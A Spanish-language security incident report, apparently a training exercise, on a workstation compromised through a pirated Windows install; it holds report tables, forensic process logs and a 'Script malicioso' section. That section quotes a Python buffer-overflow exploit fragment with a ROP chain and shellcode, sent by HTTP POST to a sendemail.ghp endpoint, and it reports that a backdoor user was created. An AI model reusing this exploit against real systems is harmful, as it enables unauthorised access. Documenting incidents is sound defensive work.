| **Informe de incidentes de seguridad** | **Grupo 3**      |
|----------------------------------------|------------------|
|                                        | **Fecha:** 11/12/2024 |
|                                        | **n.º:** 001A-2024   |
|                                        | **TLP: AMBER**       |

# Informe Técnico de Incidente de Seguridad

## **1. Introducción**

Este informe técnico está basado en un incidente de ciberseguridad que hemos detectado en el departamento de IT, donde una máquina fue afectada por la instalación de un sistema operativo Windows "pirata" y por la instalación de un script malicioso. El objetivo es ver el impacto en la empresa y definir unas medidas que permitan mitigar esta vulnerabilidad para futuros incidentes y mejorar la seguridad la organización


## **2. Aspectos clave para notificar**

| **Título**                     | **Descripción**                                                                                                                                                                                 |
| ------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Asunto**                     | Compromiso de ordenador de la empresa debido a malware de una instalación de Windows pirata.                                                                                             |
| **OSE/PSD**                    | Departamento de IT de la empresa.                                                                                                                                                               |
| **Usuario afectado**           | Jhon Doe                                                                                                                                                                                        |
| **Sector estratégico**         | Servicios de TI y soporte técnico.                                                                                                                                                              |
| **Fecha y hora del incidente** | 28/10/2024 9:05:32                                                                                                                                                           |
| **Fecha y hora de detección**  | 01/11/2024 10:00:21                                                                                                                                                            |
| **Descripción**                | Se ha detectó actividad sospechosa en una de los ordenadores de la empresa. La investigación nos dió que se había instalado un sistema operativo Windows pirata,y un script malicioso. |


## **3. Información técnica**
| **Título**                          | **Descripción**                                                                                                                  |
| ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **Recursos tecnológicos afectados** | Servicios críticos internos                                     |
| **Origen del incidente**            | Instalación de un sistema operativo Windows "pirata" sin actualizaciones de seguridad, que ha permitió el poder ejecutar un script malicioso. |
| **Taxonomía**                       | **Vulnerabilidades / Sistema vulnerable / Malware**                                                                              |
| **Nivel de peligrosidad**           | **Crítico**, por la posible filtración de datos, acceso no autorizado y riesgo de expansión dentro de la red.                    |


## **4. Evaluación del impacto**

| **Título**                  | **Descripción**                                                                        |
| --------------------------- | -------------------------------------------------------------------------------------- |
| **Nivel de impacto**        | **Alto**, por el acceso a datos internos y errores en los servicios |
| **Afectación**              | La máquina comprometida y cualquier sistema que esté dentro de la red interna   |
| **Factores clave**          |                                                                                        |

- **Tipo de amenaza:** Malware / Instalación de software no autorizado
- **Origen del ataque:** Vulnerabilidad interna por mala gestión de licencias
- **Categoría afectada:** Integridad y confidencialidad de los datos
- **Perfil de usuarios afectados:** Personal de IT con acceso a sistemas internos.
- **Número y tipo de sistemas comprometidos:** 1 estación de trabajo confirmada y con posible expansión a otros sistemas.

## **5. Acciones y contramedidas**

| **Título**                  | **Descripción**                                                                                                                          |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| **Plan de acción**          | Aislar la máquina comprometida, analizar el malware que se le ha instalado, reinstalar sistema operativo pero esta vez que sea legal y aplicar políticas de seguridad |
| **Contramedidas**           | Implementar políticas estrictas de licencias, auditorías y formación en seguridad a el personal de la empresa.                    |
| **Proceso de recuperación** | Reinstalación del sistema operativo, hacer (si lo hay) una restauración de copias de seguridad y análisis de actividad en la red.            |


## **6. Aspectos adicionales**

| **Título**                               | **Descripción**                                                                                                                   |
| ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| **Medios necesarios para la resolución** | Equipos de análisis forense, como LastActivityView para poder ver los logs del sistema                                        |
| **Extensión geográfica del incidente**   | Local, limitado a las instalaciones internas de IT                                                                              |
| **Daños reputacionales**                 | Potencial impacto reputacional moderado si se cuenta la información del incidente                                                 |


## **7. Anexos**
Se citan a continucación los logs del sistema más importante para poder analizarlos y confirmar el incidente

```plaintext
==================================================
Action Time       : 28/10/2024 9:05:34
Description       : Run .EXE file
Filename          : CONSENT.EXE
Full Path         : C:\WINDOWS\SYSTEM32\CONSENT.EXE
More Information  : Microsoft Corporation, Sistema operativo Microsoft® Windows®, UI de consentimiento para aplicaciones administrativas, 10.0.19041.1 (WinBuild.160101.0800)
File Extension    : EXE
Data Source       : C:\Windows\Prefetch\CONSENT.EXE-531BD9EA.pf
==================================================

==================================================
Action Time       : 28/10/2024 9:05:32
Description       : Run .EXE file
Filename          : SMARTSCREEN.EXE
Full Path         : C:\WINDOWS\SYSTEM32\SMARTSCREEN.EXE
More Information  : Microsoft Corporation, Sistema operativo Microsoft® Windows®, SmartScreen de Windows Defender, 10.0.19041.1 (WinBuild.160101.0800)
File Extension    : EXE
Data Source       : C:\Windows\Prefetch\SMARTSCREEN.EXE-9B5E4173.pf
==================================================

==================================================
Action Time       : 28/10/2024 9:05:26
Description       : View Folder in Explorer
Filename          : Windows Forensic Tools
Full Path         : Windows Forensic Tools-20241024T073255Z-001\Windows Forensic Tools
More Information  : 
File Extension    : 
Data Source       : HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU\\1\1\3\0
==================================================

==================================================
Action Time       : 28/10/2024 9:05:24
Description       : Run .EXE file
Filename          : SEARCHFILTERHOST.EXE
Full Path         : C:\Windows\System32\SEARCHFILTERHOST.EXE
More Information  : Microsoft Corporation, Windows® Search, Microsoft Windows Search Filter Host, 7.0.19041.4957 (WinBuild.160101.0800)
File Extension    : EXE
Data Source       : C:\Windows\Prefetch\SEARCHFILTERHOST.EXE-77482212.pf
==================================================

==================================================
Action Time       : 28/10/2024 9:05:24
Description       : Run .EXE file
Filename          : SEARCHPROTOCOLHOST.EXE
Full Path         : C:\Windows\System32\SEARCHPROTOCOLHOST.EXE
More Information  : Microsoft Corporation, Windows® Search, Microsoft Windows Search Protocol Host, 7.0.19041.4957 (WinBuild.160101.0800)
File Extension    : EXE
Data Source       : C:\Windows\Prefetch\SEARCHPROTOCOLHOST.EXE-0CB8CADE.pf
==================================================

==================================================
Action Time       : 28/10/2024 9:05:20
Description       : Run .EXE file
Filename          : dllhost.exe
Full Path         : C:\Windows\SysWOW64\dllhost.exe
More Information  : Microsoft Corporation, Microsoft® Windows® Operating System, COM Surrogate, 10.0.19041.3636 (WinBuild.160101.0800)
File Extension    : exe
Data Source       : C:\Windows\Prefetch\DLLHOST.EXE-0DFD349D.pf
==================================================

==================================================
Action Time       : 28/10/2024 9:05:20
Description       : Run .EXE file
Filename          : svchost.exe
Full Path         : C:\Windows\System32\svchost.exe
More Information  : Microsoft Corporation, Sistema operativo Microsoft® Windows®, Proceso host para los servicios de Windows, 10.0.19041.1 (WinBuild.160101.0800)
File Extension    : exe
Data Source       : C:\Windows\Prefetch\SVCHOST.EXE-5AC380EC.pf
==================================================

==================================================
Action Time       : 28/10/2024 9:04:40
Description       : View Folder in Explorer
Filename          : Eventos
Full Path         : Windows Forensic Tools-20241024T073255Z-001\Windows Forensic Tools\Eventos
More Information  : 
File Extension    : 
Data Source       : HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU\\1\1\3\0\2
==================================================

==================================================
Action Time       : 28/10/2024 9:04:13
Description       : Run .EXE file
Filename          : svchost.exe
Full Path         : C:\Windows\System32\svchost.exe
More Information  : Microsoft Corporation, Sistema operativo Microsoft® Windows®, Proceso host para los servicios de Windows, 10.0.19041.1 (WinBuild.160101.0800)
File Extension    : exe
Data Source       : C:\Windows\Prefetch\SVCHOST.EXE-43F43366.pf
==================================================

==================================================
Action Time       : 28/10/2024 9:04:13
Description       : Run .EXE file
Filename          : dllhost.exe
Full Path         : C:\Windows\System32\dllhost.exe
More Information  : Microsoft Corporation, Microsoft® Windows® Operating System, COM Surrogate, 10.0.19041.3636 (WinBuild.160101.0800)
File Extension    : exe
Data Source       : C:\Windows\Prefetch\DLLHOST.EXE-5E46FA0D.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:59:00
Description       : Run .EXE file
Filename          : WmiPrvSE.exe
Full Path         : C:\Windows\System32\wbem\WmiPrvSE.exe
More Information  : Microsoft Corporation, Microsoft® Windows® Operating System, WMI Provider Host, 10.0.19041.3636 (WinBuild.160101.0800)
File Extension    : exe
Data Source       : C:\Windows\Prefetch\WMIPRVSE.EXE-1628051C.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:58:31
Description       : Run .EXE file
Filename          : dllhost.exe
Full Path         : C:\Windows\System32\dllhost.exe
More Information  : Microsoft Corporation, Microsoft® Windows® Operating System, COM Surrogate, 10.0.19041.3636 (WinBuild.160101.0800)
File Extension    : exe
Data Source       : C:\Windows\Prefetch\DLLHOST.EXE-5E46FA0D.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:55:17
Description       : Run .EXE file
Filename          : WmiPrvSE.exe
Full Path         : C:\Windows\System32\wbem\WmiPrvSE.exe
More Information  : Microsoft Corporation, Microsoft® Windows® Operating System, WMI Provider Host, 10.0.19041.3636 (WinBuild.160101.0800)
File Extension    : exe
Data Source       : C:\Windows\Prefetch\WMIPRVSE.EXE-1628051C.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:54:37
Description       : Run .EXE file
Filename          : FTK IMAGER.EXE
Full Path         : C:\PROGRAM FILES\ACCESSDATA\FTK IMAGER\FTK IMAGER.EXE
More Information  : AccessData Group, Inc., AccessData® FTK® Imager, FTK Imager, 4.2.0.13
File Extension    : EXE
Data Source       : C:\Windows\Prefetch\FTK IMAGER.EXE-1B23CEFA.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:54:35
Description       : Run .EXE file
Filename          : CONSENT.EXE
Full Path         : C:\WINDOWS\SYSTEM32\CONSENT.EXE
More Information  : Microsoft Corporation, Sistema operativo Microsoft® Windows®, UI de consentimiento para aplicaciones administrativas, 10.0.19041.1 (WinBuild.160101.0800)
File Extension    : EXE
Data Source       : C:\Windows\Prefetch\CONSENT.EXE-531BD9EA.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:54:18
Description       : Run .EXE file
Filename          : svchost.exe
Full Path         : C:\Windows\System32\svchost.exe
More Information  : Microsoft Corporation, Sistema operativo Microsoft® Windows®, Proceso host para los servicios de Windows, 10.0.19041.1 (WinBuild.160101.0800)
File Extension    : exe
Data Source       : C:\Windows\Prefetch\SVCHOST.EXE-B25CCDFF.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:54:15
Description       : Run .EXE file
Filename          : TEXTINPUTHOST.EXE
Full Path         : C:\Windows\SYSTEMAPPS\MICROSOFTWINDOWS.CLIENT.CBS_CW5N1H2TXYEWY\TEXTINPUTHOST.EXE
More Information  : Microsoft Corporation, Microsoft® Windows® Operating System, , 124.19305.0.0
File Extension    : EXE
Data Source       : C:\Windows\Prefetch\TEXTINPUTHOST.EXE-314C3B8A.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:52:05
Description       : Run .EXE file
Filename          : svchost.exe
Full Path         : C:\Windows\System32\svchost.exe
More Information  : Microsoft Corporation, Sistema operativo Microsoft® Windows®, Proceso host para los servicios de Windows, 10.0.19041.1 (WinBuild.160101.0800)
File Extension    : exe
Data Source       : C:\Windows\Prefetch\SVCHOST.EXE-EE1C9ACA.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:51:29
Description       : Run .EXE file
Filename          : WmiPrvSE.exe
Full Path         : C:\Windows\System32\wbem\WmiPrvSE.exe
More Information  : Microsoft Corporation, Microsoft® Windows® Operating System, WMI Provider Host, 10.0.19041.3636 (WinBuild.160101.0800)
File Extension    : exe
Data Source       : C:\Windows\Prefetch\WMIPRVSE.EXE-1628051C.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:50:56
Description       : Run .EXE file
Filename          : FTK IMAGER.EXE
Full Path         : C:\PROGRAM FILES\ACCESSDATA\FTK IMAGER\FTK IMAGER.EXE
More Information  : AccessData Group, Inc., AccessData® FTK® Imager, FTK Imager, 4.2.0.13
File Extension    : EXE
Data Source       : C:\Windows\Prefetch\FTK IMAGER.EXE-1B23CEFA.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:50:54
Description       : Run .EXE file
Filename          : AUDIODG.EXE
Full Path         : C:\WINDOWS\SYSTEM32\AUDIODG.EXE
More Information  : Microsoft Corporation, Sistema operativo Microsoft® Windows®, Aislamiento de gráficos de dispositivo de audio de Windows, 10.0.19041.1 (WinBuild.160101.0800)
File Extension    : EXE
Data Source       : C:\Windows\Prefetch\AUDIODG.EXE-BDFD3029.pf
==================================================

==================================================
Action Time       : 28/10/2024 8:50:54
Description       : Run .EXE file
Filename          : CONSENT.EXE
Full Path         : C:\WINDOWS\SYSTEM32\CONSENT.EXE
More Information  : Microsoft Corporation, Sistema operativo Microsoft® Windows®, UI de consentimiento para aplicaciones administrativas, 10.0.19041.1 (WinBuild.160101.0800)
File Extension    : EXE
Data Source       : C:\Windows\Prefetch\CONSENT.EXE-531BD9EA.pf
==================================================

```
### Script malicioso

Se puede ver que el riesg es el acceso no autorizado y la posible expansión del ataque
```python
payload = "A"*2278 + rop_chain + "\x90"*4 + Shellcode4 + "B"*(1790-len(Shellcode4)-len(rop_chain)) + ret

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8089))
s.send("POST /sendemail.ghp HTTP/1.1\r\n\r\nEmail=" + payload + "&getPassword=Get+Password")
print "[+] Creado usuario ihacklabs con password Thack12/"
s.close()
```

## **Implementación de Consejos**

| **Consejo**                                 | **Aplicación en el Informe**                                                                                                                                                         |
| ------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Definir una estructura base                 | El informe está organizado en secciones claras como "Introducción", "Evaluación del impacto" y "Acciones y contramedidas"                                                          |
| Distinguir hechos de hipótesis              | Se incluyen los "aspectos clave para notificar" y "evaluación del impacto", las hipótesis y recomendaciones están en "Acciones y contramedidas". |
| Documentar todas las actividades realizadas | Se dice cada acción, desde la identificación hasta la recuperación, en "acciones y contramedidas" y "anexos".                                                                     |

